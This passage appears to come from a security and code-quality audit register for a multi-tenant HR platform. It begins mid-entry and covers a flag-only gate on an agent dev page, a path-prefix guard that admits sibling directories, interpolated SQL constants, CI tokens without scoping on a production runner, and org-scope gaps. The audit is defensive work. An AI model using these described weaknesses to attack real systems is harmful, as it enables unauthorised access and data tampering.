impact: Documentation drift only: the comment contradicts the corrected implementation and could mislead a future maintainer into re-introducing append semantics or mis-reasoning about table growth. Mirrors the class of stale-comment debt (cf. D-21) the register tracks.
recommendation: Update the comment to 'extract features → score → delete-then-insert (one active row per subject, D-18)'.

evidence: Access is controlled solely by `AGENT_DEV_ENABLED = process.env.NEXT_PUBLIC_ENABLE_AGENT_DEV === '1'` (line 29) with `if (!AGENT_DEV_ENABLED) return <DisabledNotice />` (line 195). There is no role check — any authenticated user reaching /dev/agent when the flag is '1' can POST prompts to the agent-gateway (`fetch(`${GATEWAY_URL}/agent`, { credentials:'include' })`, line 147) and resolve human-in-the-loop approvals (line 121). GATEWAY_URL is a NEXT_PUBLIC value baked into the client bundle.
impact: If NEXT_PUBLIC_ENABLE_AGENT_DEV is ever set to '1' in a shared/prod build, the agent driving+approval UI is reachable by every authenticated principal regardless of role; the only remaining barrier is whatever auth/RBAC the separate agent-gateway enforces (out of this scope). Defense is a single build-flag rather than an RBAC gate mirroring requirePermission.
recommendation: Add a role/permission check (e.g. PLATFORM_ADMIN via useCurrentUser, like system-health/page.tsx:31-37) in addition to the flag, and confirm the gateway independently enforces authz; keep the flag off in all non-dev builds.

evidence: The /admin/revoke-user route comment (lines 248-251) states 'TENANT_ADMIN scope filter (own-tenant target) is enforced post-MVP ... Cross-tenant target check is tracked as a follow-up.' In fact service.ts adminRevokeUser (lines 707-717) and adminListSessions (738-748) already block cross-tenant targets (throw when target.userTenantId !== actorTenantId for non-PLATFORM_ADMIN).
impact: No security gap — enforcement is present. The stale comment misleads auditors/maintainers into believing a cross-tenant revoke/list gap exists (or into removing the 'redundant' service check), mirroring the D-21 stale-comment pattern.
recommendation: Update the route comment to state that per-target tenant scoping is enforced in the service layer.

evidence: createInMemoryChallengeStore() (mfa-service.ts:99-139) and the WebAuthn createChallengeStore() (webauthn-service.ts:81-106) hold login/registration challenges in a per-process Map (headers explicitly note 'replace with Redis' for PM2 cluster / k8s replicas). The shared singletons are process-local.
impact: Fail-closed, not a bypass: if the API is ever scaled beyond one process, a challenge minted on process A cannot be consumed on process B, breaking the MFA second step / WebAuthn ceremonies (availability/lockout), not weakening auth. Current deploy is single-process so no live impact.
recommendation: Before any horizontal scaling, move challenge storage behind the documented shared-store seam (e.g. Redis) so challenge create/peek/consume are cluster-consistent.

evidence: pathFor() computes `const p = resolve(join(this.root, key))` then guards with `if (!p.startsWith(this.root))`. The check omits a trailing path separator, so a resolved path in a SIBLING directory that merely shares the root's textual prefix (root `/data/media`, resolved `/data/media-evil/x`) would satisfy startsWith and pass the guard. Storage keys are currently server-generated `${tenantId}/${mediaId}` UUID segments (media-service.ts:122), so no attacker input reaches key today; the comment (media-store.ts:35-36) explicitly frames this as defense-in-depth.
impact: Not currently exploitable (keys are UUIDs). If a future caller ever routes user-influenced input into a key (e.g. an S3-swap or a filename-based key), the boundary-unsafe prefix check could permit reads/writes/deletes just outside the intended storage root (path traversal / arbitrary file overwrite or deletion).
recommendation: Compare against the root WITH a trailing separator (`this.root + path.sep`) or use `path.relative(this.root, p)` and reject results that are empty, start with `..`, or are absolute. Also validate that keys contain no `..` segment.

evidence: RUN_SELECT ends with `WHERE ir.import_run_classification_scope = '${REFERENCE_SYNC_SCOPE}'` (repository.ts:245), and the ATECO upsert builds tuples with `('${ATECO_SCHEME}', $${b+1}, ...)` (repository.ts:80). Both interpolated values are hardcoded string constants (REFERENCE_SYNC_SCOPE='reference_sync'; ATECO_SCHEME='ATECO_2025'), not request input, so there is no injection today. It is a deviation from the project's raw-parameterized-SQL convention.
impact: No injection at present (constants only). The pattern is a latent hazard: a later refactor that made either value dynamic/user-derived would silently become a SQL injection because the surrounding code reads as a normal query string.
recommendation: Bind the scope/scheme as $-parameters (append to the params array) to keep the module consistent with the parameterized-SQL invariant, so no interpolated literal ever sits in a query body.

evidence: 8 of 9 workflows (typecheck, lint, shell-tests, test-integration, build-web, playwright-smoke, state-lint, i18n-parity) declare no `permissions:` key (grep found `permissions:` only in showcase.yml:20). They run on `runs-on: [self-hosted, oci-vm]` which the comments state 'sits on the PROD host'. Without a permissions block the job's GITHUB_TOKEN uses the repository/org default scope.
impact: If the org/repo default token scope is read-write, any code execution inside a CI step on the production host (e.g. a malicious dependency lifecycle script, see related finding) receives a write-capable token able to push commits, tamper with releases, or open/merge changes. Defense-in-depth gap amplified by the prod-host runner.
recommendation: Add top-level `permissions: contents: read` (or `{}`) to every workflow and elevate per-job only where needed (showcase already scopes contents:write). Confirm the org default is set to read-only.

evidence: sys_user_auth_roles.user_auth_role_tenant_id is nullable (`uuid REFERENCES sys.sys_tenancies ON DELETE CASCADE`, 000005:584; the active-unique index COALESCEs NULL to the zero-uuid, 000005:602). Live scan shows 12 sys tables with a nullable *_tenant_id, including sys_skills (000013:89, global-ESCO vs tenant-custom pattern), sys_kpi_definitions, sys_learning_modules/paths, sys_user_preferences, sys_notification_preferences. The schema alone therefore permits a tenant-less role grant / row.
impact: For the catalog tables this is the intentional 'NULL tenant = system/global row' pattern and is safe. But because the schema does not distinguish 'legitimately global' from 'accidentally tenant-less', I5 correctness for these tables rests entirely on the middleware/RBAC resolver correctly treating NULL tenant (a NULL-tenant grant of a non-platform role, or a query that forgets the `OR tenant_id IS NULL` branch, would misbehave). No misuse observed in schema; flagged so app-layer enforcement is verified, not assumed.
recommendation: Confirm the RBAC resolver (lib/scope/resolver.ts) only honors NULL-tenant grants for platform-plane roles, and that tenant-scoped reads on the global-catalog tables use an explicit `tenant_id = $1 OR tenant_id IS NULL` predicate. Consider a CHECK or partial constraint tying NULL tenant_id to platform/system rows where feasible.

evidence: Representative: sys_user_profiles.created_by / updated_by are `uuid REFERENCES sys.sys_users(user_id) ON DELETE SET NULL` (000006:27,29) with no index. Live pg_index scan counts 114 such created_by/updated_by FK columns in sys with no supporting index (of 258 unindexed FKs total).
impact: Minimal: these columns are ON DELETE SET NULL (so deleting a user does not seq-scan-cascade — it seq-scans to null out, but user deletion is rare) and are almost never used as a query filter. Listed so the 258-unindexed-FK total is not misread as all load-bearing.
recommendation: No action required; do not blanket-index. Add an index only for a specific audited query need.

evidence: sys_user_profile_embeddings declares bare `user_id` (000060:104) and `tenant_id` (000060:105), whereas every other sys satellite prefixes the entity (e.g. user_profile_tenant_id, user_pay_slip_tenant_id). It is otherwise correct (both NOT NULL, tenant_idx present at 000060:113-114). sys_tenancies.tenant_id is the legitimate PK exception.
impact: No runtime bug. Convention drift only: generic column names complicate grep-based tooling, cross-table joins, and the project's column-naming invariant; a future ambiguous join is the realistic risk.
recommendation: Low-priority: rename to user_profile_embedding_user_id / _tenant_id in a future migration, or document the exception. Not worth a standalone migration unless a broader rename lands.

evidence: sys.sys_position_intelligence_profiles_v is a plain CREATE OR REPLACE VIEW (migration comment line 270: 'can be promoted to MATERIALIZED VIEW in a follow-up migration'). pg_matviews returns zero rows — no matview exists. pg_get_viewdef shows 6 correlated scalar subqueries per row (required_skills, required_kpis, required_learning_paths, career_paths, compensation_profile, succession_relevance). It is only read at positions/repository.ts:284 with `WHERE position_id = $1` (single row); EXPLAIN of a full scan shows the 6 SubPlans would run once per position.
impact: No current hotspot because every read is single-position. But the ADR-0008 materialization was deferred, so any future list/export path that selects from this view unfiltered would incur O(positions x 6) correlated subqueries with no protection. Two of the subplans (sys_position_career_paths, sys_position_succession_relevance) already resolve to Seq Scans.
recommendation: Either honor ADR-0008 and promote to a materialized view (with a refresh trigger/schedule), or document that the view is intentionally single-position-only and add a guard/lint so it is never selected list-wide.

evidence: `find packages -name '*.test.ts'` returns nothing; packages/ contains only `shared`. shared exports runtime logic consumed by both api and web (e.g. NON_PRIVILEGED_UPDATABLE_FIELDS imported at apps/api/src/modules/users/service.ts:27, response schemas, serializers). A prior Zod 3→4 version drift in packages/shared broke type-checking (session memory 14069) — exactly the class of regression a unit test would pin.
impact: Validation/serialization contract regressions in the shared package surface only indirectly (or not at all) and can silently change API/web behavior; the shared source-of-truth is unguarded.
recommendation: Add unit tests for shared Zod schemas (parse/refine edge cases), serializers, and exported constants; wire packages/shared into CI test matrix.

evidence: The suite imports FakeEmbedder/fakeVector (line 7) and inserts deterministic vectors directly into sys_*_embeddings (lines 101-126). This correctly tests the matching MATH offline, but no test covers the production VoyageEmbedder path (auth, dimension mismatch, provider error/timeout handling). semantic-matching-backfill.test.ts and -substrate also operate on pre-seeded vectors.
impact: Embedding-provider integration failures (dimension drift, API errors, malformed responses) have zero test coverage; a broken real embedder would ship green.
recommendation: Add a focused test for the VoyageEmbedder client contract (mock the HTTP layer, not the whole embedder) covering dimension, error and retry handling.

evidence: playwright.config.ts:8-14 documents that this dev-mode config is for PER-SPEC iteration only — storageState sessions are 'only safe for ~15 minutes'; running the full 60-spec suite silent-refreshes the SAME single-use token across contexts, tripping replay-detection and revoking the family mid-suite. Mitigation exists (playwright.prod.config.ts present, mid-suite re-login) but nothing prevents `pnpm test:e2e` from running the full suite against the dev config.
impact: Anyone running the full E2E suite against the default dev config gets nondeterministic mid-suite auth failures that look like product bugs.
recommendation: Fail-fast if the dev config is used with more than a per-spec filter, or converge dev/prod configs on the mid-suite re-login strategy.

evidence: global-teardown.ts deletes ESS certs, approvals, leads and survey responses via psql keyed on string LIKE prefixes ('E2E Test Cert%', 'E2E Approval%', '%@leads-e2e.test', 'ESS::%'). Every branch swallows errors (lines 50-52, 71-73, 91-93, 117-119) and there is NO per-spec teardown — the specs create rows on surfaces with no DELETE endpoint and rely entirely on this global hook running after the suite.
impact: If the suite aborts before globalTeardown, or a spec's row-naming prefix drifts from the teardown filter, orphan rows accumulate unbounded in the shared DB run-over-run (the drift the hook was written to prevent).
recommendation: Move cleanup into per-spec afterEach/afterAll where possible, or key deletes on a run-scoped marker column rather than fragile title/email prefixes; alert (not just log) when a teardown branch fails.

evidence: capability-maturity/repository.ts:18 `export { loadActiveTenantIds } from "../capability-composition/repository.js"` — one repository re-exports a helper from a sibling module's repository. Separately ~15 services import sibling repositories' find*ById helpers, and analytics/service.ts:30 + insights/service.ts:37 both import findOwnedPositionIds from dashboard/repository.ts, making dashboard/repository an implicit shared-helper hub.
impact: Repository-layer-to-repository-layer coupling (vs the established service->sibling-repo referential-check pattern) blurs module ownership: capability-composition's persistence internals are now a public dependency of capability-maturity. Low blast radius today, but it normalizes reaching across the repository boundary and can seed harder-to-trace coupling as the capability domain grows.
recommendation: Promote genuinely shared read helpers (loadActiveTenantIds, findOwnedPositionIds) into a small shared lib (e.g. apps/api/src/lib/tenancy or lib/positions) both modules import, rather than one repository re-exporting from another; keep cross-module dependencies flowing through service or lib layers, not repo->repo.

evidence: listRewardGates() correctly applies resolveOrgReadScope + canReadOrgTarget (lines 44-61, the D-50 fix). But getProfileByPosition() (lines 33-42) returns a full CompensationProfile for any position in the actor's tenant gated only by position-tenant equality, and getRewardGateDistribution() (lines 63-66) returns tenant-wide reward-gate status distribution — neither narrows to the actor's organizational sub-tree.
impact: Any holder of the compensation read permission whose scope should be a sub-tree (e.g. a line manager, not TENANT_ADMIN/HRMS_MANAGER) can read pay-band profiles for positions outside their org sub-tree and see tenant-wide compensation posture. Real impact depends on which roles hold the permission (RBAC still gates entry) and on whether position profiles are considered person-level; it may be intended (position-centric I1, aggregate counts). Reported Low for confirmation.
recommendation: Confirm intent: if position comp profiles are person-sensitive, apply the same resolveOrgReadScope allow-list / canReadOrgTarget check used by listRewardGates; if intentionally tenant-wide for HR roles, document the asymmetry so it is not read as an oversight.
